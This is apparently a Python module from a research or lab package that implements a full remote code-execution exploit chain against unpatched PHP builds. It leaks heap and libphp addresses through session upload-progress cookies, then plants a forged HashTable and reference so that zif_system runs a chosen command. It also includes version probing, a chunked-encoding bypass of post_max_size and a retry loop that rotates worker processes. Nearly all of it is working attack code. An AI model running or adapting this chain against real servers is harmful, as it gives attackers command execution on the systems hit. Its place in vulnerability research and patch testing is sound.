"""Warning-chain reimplementation for the clean-room p2s package (docs/76 R2).

Full `display_errors=On` chain: heap leak (stage 1), libphp leak (stage 2) and
the fake-reference endgame (stage 3), plus the candidate/attempt loop the old
lab tool used.  The request shapes are derived from the documented behavior
(docs/38, 44, 55, 61), not from upstream code.
"""
from __future__ import annotations

import os
import re
import struct
import time
from dataclasses import dataclass
from typing import Callable

from . import leaks, multipart, transport


class ChainError(RuntimeError):
    """The chain could not reach the endgame (leak failed or no proof)."""

VERSION_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")


@dataclass
class WarningConfig:
    session_name: str = "PHPSESSID"
    huge_mb: int = 12
    stage1_fields: int = 1001
    stage1_n: int = 841
    stage2_fields: int = 1001
    stage2_t: int = 406
    stage2_v: int = 16
    stage2_groups: int = 983
    stage3_pads: tuple[tuple[int, int], ...] = ((31, 31),) * 6
    stage3_a_extra: int = 0
    stage3_a_len: int = 7
    stage3_fill_len: int = 15
    stage3_carrier_len: int = 15
    # 8M stock shape: two 15-byte fillers before the carrier (profiles.py
    # default).  A third filler shifts the carrier out of the bin-40 slot and
    # stage 3 silently misses (docs/84).
    stage3_f_pads: int = 2
    stage3_ht_copies: int = 15
    # Send the OOM requests (the ones that carry the huge field) with
    # ``Transfer-Encoding: chunked`` and no Content-Length.  Required when the
    # target's post_max_size is smaller than memory_limit: php-src 8.3
    # ``main/rfc1867.c:720`` rejects the whole body when
    # ``content_length > post_max_size``, and chunked makes content_length 0.
    # Measured CMS shape: MediaWiki 1.43.9 (8.3.35, 128M/8M), docs/47 §1,
    # docs/48 §3.1, docs/52 N1.
    chunked: bool = False
    retries: int = 3
    timeout: float = 90.0
    sid: str = "attacksessionid0001"


def probe(endpoint: transport.Endpoint) -> dict:
    """Read X-Powered-By and decide whether the build is patched."""
    r = transport.get(endpoint, timeout=15)
    text = r.headers.get("x-powered-by", "")
    m = VERSION_RE.search(text)
    out = {"status": r.status, "version": None, "patched": None,
           "powered_by": text}
    if m:
        ver = tuple(int(x) for x in m.groups())
        out["version"] = ".".join(map(str, ver))
        floors = {(8, 2): (8, 2, 35), (8, 3): (8, 3, 36),
                  (8, 4): (8, 4, 27), (8, 5): (8, 5, 12)}
        floor = floors.get(ver[:2])
        out["patched"] = bool(floor and ver >= floor)
    return out


def _headers(ep: transport.Endpoint, bnd: str, length: int,
             cookie: str | None = None) -> list[tuple[str, str]]:
    h = [("Host", "%s:%d" % (ep.host, ep.port))]
    if cookie:
        h.append(("Cookie", cookie))
    h += [("Content-Type", multipart.content_type(bnd)),
          ("Content-Length", str(length)),
          ("Connection", "close")]
    return h


def _post(ep: transport.Endpoint, parts: list[multipart.Field], *,
          cookie: str | None = None, timeout: float = 90.0,
          read_cap: int = 1 << 20,
          boundary: str | None = None,
          chunked: bool = False) -> bytes:
    body, bnd = multipart.encode(parts, boundary=boundary)
    if chunked:
        # No Content-Length: the only shape that reaches targets whose
        # post_max_size is below memory_limit (docs/47 §1, docs/52 N1).
        extra = [("Cookie", cookie)] if cookie else []
        return transport.post_chunked_raw(ep, body, bnd, timeout=timeout,
                                          read_cap=read_cap, headers=extra,
                                          ignore_send_errors=True)
    raw = transport.build_request(
        "POST", ep.base_path, _headers(ep, bnd, len(body), cookie), body)
    return transport.raw_exchange(ep, raw, timeout=timeout,
                                  read_cap=read_cap)


def stage1_candidates(ep: transport.Endpoint, cfg: WarningConfig) -> list[int]:
    """Return candidate 2 MiB chunk bases from the Set-Cookie leak."""
    # A: fill the chunk, arm upload-progress, OOM on a 12 MiB field.
    parts = [multipart.Field("p%04d" % i, b"x")
             for i in range(cfg.stage1_fields)]
    parts += [multipart.Field(cfg.session_name, b"\x00"),
              multipart.Field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
              multipart.Field("f", b"A" * 64, "a.txt",
                              "application/octet-stream"),
              multipart.Field("big", b"B" * (cfg.huge_mb << 20))]
    _post(ep, parts, timeout=cfg.timeout, read_cap=1 << 20,
          boundary="S" * 17, chunked=cfg.chunked)
    time.sleep(0.2)

    # B: stale id + reference reads 0x1000 bytes from the forged string.
    parts = [multipart.Field(cfg.session_name, cfg.sid.encode()),
             multipart.Field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(cfg.stage1_n):
        value = (("v%04d" % i) + "x" * 44)[:48].encode()
        parts.append(multipart.Field(str(1000 + i), value))
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, 0x10, 0x1000)   # zend_string len
    forged[0x18] = ord("L")
    parts.append(multipart.Field("1999", bytes(forged)))
    raw = _post(ep, parts, timeout=cfg.timeout, read_cap=9 << 20,
                boundary="B" * 10)
    cookie = transport.parse_set_cookie(raw, cfg.session_name)
    if not cookie:
        raise RuntimeError("no Set-Cookie leak (status parse failed)")
    return leaks.chunk_candidates(cookie, min_votes=2, limit=4)


def stage2_libphp(ep: transport.Endpoint, cfg: WarningConfig,
                  dtor_offset: int) -> int:
    """Leak the libphp base through the 56-byte HashTable page."""
    parts = [multipart.Field(("f%04d" % i)[:5], b"x" * 39)
             for i in range(cfg.stage2_fields)]
    parts += [multipart.Field(cfg.session_name, b"\x00"),
              multipart.Field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
              multipart.Field("f", b"A" * 64, "a.txt",
                              "application/octet-stream"),
              multipart.Field("big", b"B" * (cfg.huge_mb << 20))]
    _post(ep, parts, timeout=cfg.timeout, read_cap=1 << 20,
          boundary="S" * 17, chunked=cfg.chunked)
    time.sleep(0.2)

    parts = [multipart.Field(cfg.session_name, cfg.sid.encode()),
             multipart.Field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(cfg.stage2_groups):
        count = 16 if i == cfg.stage2_t else 1
        for j in range(count):
            parts.append(multipart.Field("a%04d[%d]" % (i, j),
                                         b"x" * cfg.stage2_v))
    raw = _post(ep, parts, timeout=cfg.timeout, read_cap=1 << 20,
                boundary="B" * 10)
    cookie = transport.parse_set_cookie(raw, cfg.session_name)
    if not cookie:
        raise RuntimeError("no Set-Cookie leak (stage2)")
    return leaks.libphp_from_cookie(cookie, dtor_offset)


def fake_payload(htdata: int, zif: int, cmd: bytes) -> tuple[bytes, bytes]:
    """167-byte fake HashTable + 55-byte fake reference (docs/55 §2)."""
    if len(cmd) > 87 or b"\x00" in cmd:
        raise ValueError("command must be 1..87 bytes without NUL")
    ht = bytearray(167)
    struct.pack_into("<II", ht, 0x00, 1, 7)                  # rc / IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags / mask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)                 # used / elements
    struct.pack_into("<II", ht, 0x20, 8, 0)                 # size / ptr
    struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor
    e = 0x20                                                # fake execute_data
    struct.pack_into("<Q", ht, e + 0x10, zif)               # return_value
    struct.pack_into("<I", ht, e + 0x2C, 1)                 # num_args
    struct.pack_into("<Q", ht, e + 0x50, htdata + 0x80)     # arg1
    struct.pack_into("<I", ht, e + 0x58, 6)                 # IS_STRING
    struct.pack_into("<II", ht, 0x80, 1, 0x106)             # fake string
    struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0

    ref = bytearray(b"X" * 55)
    struct.pack_into("<II", ref, 0x10, 1, 10)               # IS_REFERENCE
    struct.pack_into("<Q", ref, 0x18, htdata)               # val.value
    struct.pack_into("<Q", ref, 0x20, 0x307)                # IS_ARRAY_EX
    struct.pack_into("<Q", ref, 0x28, 0)                    # sources
    return bytes(ht), bytes(ref)


def carrier_bytes(htdata: int, length: int = 15) -> bytes:
    """Fake 15-byte reference fragment that lands in the session vars bin."""
    out = bytearray(struct.pack("<II", 1, 0x1A)
                    + struct.pack("<Q", htdata)[:7])
    if length > 15:
        out.append(0)
        if length >= 20:
            out += struct.pack("<I", 0x307)
    if len(out) < length:
        out += b"\x00" * (length - len(out))
    return bytes(out[:length])


def rotate(ep: transport.Endpoint, cfg: WarningConfig) -> None:
    """Force a fresh prefork child over HTTP."""
    parts = [multipart.Field(("f%04d" % i)[:5], b"V" * 3000)
             for i in range(1001)]
    parts += [multipart.Field(cfg.session_name, b"\x00"),
              multipart.Field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
              multipart.Field("f", b"A" * 64, "a.txt",
                              "application/octet-stream"),
              multipart.Field("big", b"B" * (cfg.huge_mb << 20))]
    _post(ep, parts, timeout=cfg.timeout, read_cap=1 << 20,
          boundary="S" * 17, chunked=cfg.chunked)
    time.sleep(0.2)
    parts = [multipart.Field(cfg.session_name, cfg.sid.encode()),
             multipart.Field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    _post(ep, parts, timeout=20, read_cap=65536, boundary="B" * 10)
    time.sleep(0.5)


def stage3(ep: transport.Endpoint, cfg: WarningConfig, htdata: int,
           zif: int, cmd: bytes) -> None:
    """Place the fake HashTable/reference and trigger zif_system."""
    parts = [multipart.Field(cfg.session_name, b"a" * 19),
             multipart.Field("PHP_SESSION_UPLOAD_PROGRESS", b"p" * 3)]
    for i, (nl, vl) in enumerate(cfg.stage3_pads):
        name = (("p%0*d" % (nl - 1, i)) if nl > 0 else "")[:nl]
        parts.append(multipart.Field(name, b"V" * vl))
    for i in range(cfg.stage3_a_extra):
        parts.append(multipart.Field("x%02d" % i, b"Z" * cfg.stage3_a_len))
    parts += [multipart.Field("f", b"A" * 64, "a.txt",
                              "application/octet-stream"),
              multipart.Field("big", b"B" * (cfg.huge_mb << 20))]
    cookie_value = "a" * max(32, 41 - len(cfg.session_name))
    raw_a = _post(ep, parts, cookie=cfg.session_name + "=" + cookie_value,
                  timeout=cfg.timeout, read_cap=1 << 20, boundary="S" * 17,
                  chunked=cfg.chunked)
    if os.environ.get("P2S_DEBUG"):
        print("[A] %r" % raw_a[:60])
    time.sleep(0.3)

    ht, _ref = fake_payload(htdata, zif, cmd)
    parts = [multipart.Field(cfg.session_name, cfg.sid.encode()),
             multipart.Field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    carrier = carrier_bytes(htdata, cfg.stage3_carrier_len)
    for i in range(cfg.stage3_f_pads):
        parts.append(multipart.Field("f%02d" % i, b"F" * cfg.stage3_fill_len))
    parts.append(multipart.Field("g00", carrier))
    for i in range(cfg.stage3_ht_copies):
        parts.append(multipart.Field(("a%030d" % i)[:31], ht))
    raw_b = _post(ep, parts, timeout=30, read_cap=65536, boundary="B" * 10)
    if os.environ.get("P2S_DEBUG"):
        print("[B] %r" % raw_b[:60])


@dataclass
class RunResult:
    chunk: int = 0
    pie: int = 0
    htdata: int = 0
    zif: int = 0
    candidates: tuple[int, ...] = ()
    attempts: int = 0
    proof: str = ""

    @property
    def passed(self) -> bool:
        return bool(self.proof)


def _leak_stage1(ep: transport.Endpoint, cfg: WarningConfig,
                 say: Callable[[str], None]) -> list[int]:
    for attempt in range(1, cfg.retries + 1):
        say("[*] stage 1: heap leak (attempt %d/%d)" % (attempt, cfg.retries))
        try:
            out = stage1_candidates(ep, cfg)
        except (OSError, RuntimeError, ValueError) as exc:
            say("[-] stage 1 error: %s" % exc)
            out = []
        if out:
            return out
        say("[-] heap leak missed")
        rotate(ep, cfg)
    raise ChainError("heap leak failed after %d attempts" % cfg.retries)


def _leak_stage2(ep: transport.Endpoint, cfg: WarningConfig,
                 dtor_offset: int, say: Callable[[str], None]) -> int:
    for attempt in range(1, cfg.retries + 1):
        say("[*] stage 2: libphp leak (attempt %d/%d)" % (attempt, cfg.retries))
        try:
            base = stage2_libphp(ep, cfg, dtor_offset)
        except (OSError, RuntimeError, ValueError) as exc:
            say("[-] stage 2 error: %s" % exc)
            base = 0
        if base:
            return base
        say("[-] libphp leak missed")
        rotate(ep, cfg)
    raise ChainError("libphp leak failed after %d attempts" % cfg.retries)


def run(endpoint: transport.Endpoint, cfg: WarningConfig, *,
        dtor_offset: int, htdata_offset: int, zif_offset: int, cmd: bytes,
        attempts: int = 3,
        check_proof: Callable[[], str] | None = None,
        pre_rotate: bool = True,
        log: Callable[[str], None] | None = None) -> RunResult:
    """Full warning chain: leak, then try every candidate until proof.

    The endgame is probabilistic per candidate/attempt: the fake reference may
    land on a slot the request does not reuse.  The old lab tool therefore
    tried up to four heap candidates and rotated the worker between misses;
    reproducing that loop is what closes the clean-room stage 3 (docs/84).
    """
    say = log or (lambda _msg: None)
    if pre_rotate:
        rotate(endpoint, cfg)

    candidates = _leak_stage1(endpoint, cfg, say)
    say("[+] chunk candidates: " + ", ".join("0x%x" % c for c in candidates))
    rotate(endpoint, cfg)

    pie = _leak_stage2(endpoint, cfg, dtor_offset, say)
    say("[+] libphp base = 0x%x" % pie)
    rotate(endpoint, cfg)

    result = RunResult(pie=pie, candidates=tuple(candidates),
                       zif=pie + zif_offset)
    for ci, chunk in enumerate(candidates[:4], 1):
        htdata = chunk + htdata_offset
        result.chunk = chunk
        result.htdata = htdata
        say("[*] stage 3 (heap %d/%d): HTDATA=0x%x ZIF=0x%x"
            % (ci, min(len(candidates), 4), htdata, result.zif))
        tries = attempts if ci == 1 else 2
        for attempt in range(1, tries + 1):
            result.attempts += 1
            try:
                stage3(endpoint, cfg, htdata, result.zif, cmd)
            except OSError as exc:
                say("[-] stage 3 request error: %s" % exc)
            time.sleep(0.8)
            proof = check_proof() if check_proof else ""
            if proof:
                result.proof = proof
                say("[+] proof after attempt %d (heap %d): %s"
                    % (attempt, ci, proof.splitlines()[0] if proof else ""))
                return result
            say("[-] no proof (attempt %d, heap %d)" % (attempt, ci))
            rotate(endpoint, cfg)
    return result

